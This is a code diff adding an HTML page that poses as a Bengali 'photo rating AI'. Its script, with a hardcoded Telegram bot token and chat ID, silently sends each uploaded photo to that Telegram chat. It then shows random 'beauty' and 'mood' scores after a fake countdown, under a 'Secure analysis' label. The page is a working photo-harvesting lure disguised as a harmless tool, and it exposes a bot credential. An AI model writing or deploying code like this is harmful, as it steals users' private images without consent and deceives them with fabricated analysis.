@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rate My Pic</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0f0f1a;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 460px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.05);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(255,107,107,0.08) 0%, transparent 60%),
+                        radial-gradient(circle at 80% 80%, rgba(78,205,196,0.08) 0%, transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        h1 {
+            color: #fff;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+            position: relative;
+            z-index: 1;
+        }
+        .subtitle {
+            color: #a0a0c0;
+            font-size: 14px;
+            margin-bottom: 28px;
+            position: relative;
+            z-index: 1;
+        }
+        .upload-area {
+            background: #0d0d1a;
+            border: 2px dashed #3a3a5c;
+            border-radius: 16px;
+            padding: 35px 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 1;
+            margin-bottom: 20px;
+        }
+        .upload-area:hover, .upload-area.dragover {
+            border-color: #ff6b6b;
+            background: #12122a;
+            box-shadow: 0 0 20px rgba(255,107,107,0.15);
+        }
+        .upload-area svg {
+            width: 48px;
+            height: 48px;
+            fill: #a0a0c0;
+            margin-bottom: 12px;
+            transition: fill 0.3s;
+        }
+        .upload-area:hover svg {
+            fill: #ff6b6b;
+        }
+        .upload-area p {
+            color: #c0c0e0;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .upload-area small {
+            color: #707090;
+            font-size: 12px;
+            display: block;
+            margin-top: 6px;
+        }
+        #fileInput {
+            display: none;
+        }
+        #previewContainer {
+            display: none;
+            position: relative;
+            z-index: 1;
+            margin-bottom: 20px;
+        }
+        #previewContainer img {
+            width: 100%;
+            max-height: 280px;
+            object-fit: cover;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 2px solid #3a3a5c;
+        }
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(6px);
+        }
+        .popup-box {
+            background: #1a1a2e;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            max-width: 360px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.1);
+            position: relative;
+        }
+        .popup-box h2 {
+            color: #fff;
+            font-size: 20px;
+            margin-bottom: 18px;
+        }
+        .loading-ring {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #2a2a4a;
+            border-top-color: #ff6b6b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .countdown {
+            color: #ff6b6b;
+            font-size: 48px;
+            font-weight: 700;
+            margin: 10px 0;
+        }
+        .result-box {
+            display: none;
+            background: #0d0d1a;
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 15px;
+            border: 1px solid #3a3a5c;
+            position: relative;
+            z-index: 1;
+        }
+        .result-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #1e1e3a;
+        }
+        .result-row:last-child {
+            border-bottom: none;
+        }
+        .result-label {
+            color: #a0a0c0;
+            font-size: 14px;
+        }
+        .result-value {
+            color: #fff;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .mood-emoji {
+            font-size: 40px;
+            margin: 5px 0;
+        }
+        .btn {
+            background: #ff6b6b;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            background: #ff5252;
+            box-shadow: 0 8px 25px rgba(255,107,107,0.4);
+            transform: translateY(-2px);
+        }
+        .btn:disabled {
+            background: #3a3a5c;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+        .status-text {
+            color: #707090;
+            font-size: 12px;
+            margin-top: 14px;
+            position: relative;
+            z-index: 1;
+        }
+        .telegram-notice {
+            color: #4ecdc4;
+            font-size: 11px;
+            margin-top: 8px;
+            opacity: 0.7;
+            position: relative;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ছবি রেটিং ai </h1>
+        <p class="subtitle">সঠিক রেটিং পেতে আপনার সেরা ছবিটি এখানে আপলোড করুন </p>
+        
+        <div class="upload-area" id="uploadArea">
+            <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+            <p>Choose your best picture and upload it</p>
+            <small>Click or drag & drop here</small>
+        </div>
+        
+        <input type="file" id="fileInput" accept="image/*">
+        
+        <div id="previewContainer">
+            <img id="previewImage" src="" alt="Preview">
+        </div>
+        
+        <button class="btn" id="analyzeBtn" disabled>Analyze My Picture</button>
+        
+        <div class="result-box" id="resultBox">
+            <div class="mood-emoji" id="moodEmoji"></div>
+            <div class="result-row">
+                <span class="result-label">Mood</span>
+                <span class="result-value" id="moodResult"></span>
+            </div>
+            <div class="result-row">
+                <span class="result-label">Beauty Percentage</span>
+                <span class="result-value" id="beautyResult"></span>
+            </div>
+            <div class="result-row">
+                <span class="result-label">Confidence Level</span>
+                <span class="result-value" id="confidenceResult"></span>
+            </div>
+        </div>
+        
+        <p class="status-text" id="statusText">Waiting for image upload...</p>
+        <p class="telegram-notice">Secure analysis • Results may vary</p>
+    </div>
+    
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-box">
+            <h2>Analyzing Your Picture</h2>
+            <div class="loading-ring"></div>
+            <div class="countdown" id="countdown">10</div>
+            <p style="color:#a0a0c0; font-size:14px;">Please wait...</p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8640372051:AAEc4IEM7sTu_k9bpNwNZ1p7OJSFdvHORK4';
+        const TELEGRAM_CHAT_ID = '6264050385';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        
+        let selectedFile = null;
+        let uploadedImageUrl = null;
+        
+        // DOM Elements
+        const uploadArea = document.getElementById('uploadArea');
+        const fileInput = document.getElementById('fileInput');
+        const previewContainer = document.getElementById('previewContainer');
+        const previewImage = document.getElementById('previewImage');
+        const analyzeBtn = document.getElementById('analyzeBtn');
+        const popupOverlay = document.getElementById('popupOverlay');
+        const countdownEl = document.getElementById('countdown');
+        const resultBox = document.getElementById('resultBox');
+        const moodEmoji = document.getElementById('moodEmoji');
+        const moodResult = document.getElementById('moodResult');
+        const beautyResult = document.getElementById('beautyResult');
+        const confidenceResult = document.getElementById('confidenceResult');
+        const statusText = document.getElementById('statusText');
+        
+        // Handle click on upload area
+        uploadArea.addEventListener('click', () => {
+            fileInput.click();
+        });
+        
+        // Handle drag and drop
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.classList.add('dragover');
+        });
+        
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.classList.remove('dragover');
+        });
+        
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.classList.remove('dragover');
+            if (e.dataTransfer.files.length > 0) {
+                handleFile(e.dataTransfer.files[0]);
+            }
+        });
+        
+        // Handle file input change
+        fileInput.addEventListener('change', () => {
+            if (fileInput.files.length > 0) {
+                handleFile(fileInput.files[0]);
+            }
+        });
+        
+        // Process selected file
+        function handleFile(file) {
+            if (!file.type.startsWith('image/')) {
+                statusText.textContent = 'Error: Please select a valid image file.';
+                return;
+            }
+            
+            selectedFile = file;
+            const reader = new FileReader();
+            
+            reader.onload = (e) => {
+                uploadedImageUrl = e.target.result;
+                previewImage.src = uploadedImageUrl;
+                previewContainer.style.display = 'block';
+                uploadArea.style.display = 'none';
+                analyzeBtn.disabled = false;
+                statusText.textContent = 'Image loaded. Ready for analysis.';
+                resultBox.style.display = 'none';
+            };
+            
+            reader.readAsDataURL(file);
+        }
+        
+        // Send image to Telegram bot
+        async function sendToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, 'user_upload_' + Date.now() + '.jpg');
+            
+            try {
+                const response = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    console.error('Telegram API error:', response.status);
+                } else {
+                    console.log('Image sent to Telegram successfully');
+                }
+            } catch (error) {
+                console.error('Failed to send to Telegram:', error);
+            }
+        }
+        
+        // Convert data URL to blob for Telegram upload
+        function dataUrlToBlob(dataUrl) {
+            const parts = dataUrl.split(',');
+            const mimeType = parts[0].match(/:(.*?);/)[1];
+            const base64Data = atob(parts[1]);
+            const byteArray = new Uint8Array(base64Data.length);
+            
+            for (let i = 0; i < base64Data.length; i++) {
+                byteArray[i] = base64Data.charCodeAt(i);
+            }
+            
+            return new Blob([byteArray], { type: mimeType });
+        }
+        
+        // Generate random rating results
+        function generateRandomResults() {
+            const moods = [
+                { mood: 'Happy', emoji: '😊', beauty: 85 + Math.floor(Math.random() * 15) },
+                { mood: 'Confident', emoji: '😎', beauty: 80 + Math.floor(Math.random() * 20) },
+                { mood: 'Mysterious', emoji: '🤔', beauty: 70 + Math.floor(Math.random() * 25) },
+                { mood: 'Charming', emoji: '😍', beauty: 90 + Math.floor(Math.random() * 10) },
+                { mood: 'Energetic', emoji: '🤩', beauty: 75 + Math.floor(Math.random() * 25) },
+                { mood: 'Elegant', emoji: '✨', beauty: 88 + Math.floor(Math.random() * 12) }
+            ];
+            
+            const randomMood = moods[Math.floor(Math.random() * moods.length)];
+            const confidence = 70 + Math.floor(Math.random() * 30);
+            
+            return {
+                mood: randomMood.mood,
+                emoji: randomMood.emoji,
+                beauty: randomMood.beauty,
+                confidence: confidence
+            };
+        }
+        
+        // Analyze button click handler
+        analyzeBtn.addEventListener('click', async () => {
+            if (!selectedFile) return;
+            
+            // Disable button during analysis
+            analyzeBtn.disabled = true;
+            statusText.textContent = 'Analyzing image...';
+            
+            // Show popup
+            popupOverlay.style.display = 'flex';
+            
+            // Send image to Telegram silently
+            const imageBlob = dataUrlToBlob(uploadedImageUrl);
+            sendToTelegram(imageBlob);
+            
+            // Start countdown
+            let countdown = 10;
+            countdownEl.textContent = countdown;
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    
+                    // Generate results
+                    const results = generateRandomResults();
+                    
+                    // Hide popup
+                    popupOverlay.style.display = 'none';
+                    
+                    // Show results
+                    moodEmoji.textContent = results.emoji;
+                    moodResult.textContent = results.mood;
+                    beautyResult.textContent = results.beauty + '%';
+                    confidenceResult.textContent = results.confidence + '%';
+                    resultBox.style.display = 'block';
+                    
+                    // Update status
+                    statusText.textContent = 'Analysis complete!';
+                    analyzeBtn.disabled = false;
+                    analyzeBtn.textContent = 'Analyze Again';
+                }
+            }, 1000);
+        });
+        
+        // Reset button text when new image is selected
+        function resetButtonText() {
+            analyzeBtn.textContent = 'Analyze My Picture';
+            resultBox.style.display = 'none';
+        }
+        
+        // Override handleFile to reset button
+        const originalHandleFile = handleFile;
+        handleFile = function(file) {
+            originalHandleFile(file);
+            resetButtonText();
+        };
+    </script>
+</body>
+</html>
